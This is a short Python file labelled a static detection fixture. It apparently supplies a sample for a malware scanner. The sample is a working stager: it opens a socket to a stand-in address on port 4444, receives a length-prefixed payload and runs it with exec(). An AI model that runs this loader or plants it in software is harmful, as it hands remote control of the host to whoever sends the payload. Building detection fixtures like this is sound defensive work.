# Static detection fixture; never execute.
import socket
import struct

sock = socket.socket()
sock.connect(("192.0.2.1", 4444))
length = struct.unpack(">I", sock.recv(4))[0]
payload = sock.recv(length)
namespace = {}
exec(payload, namespace)
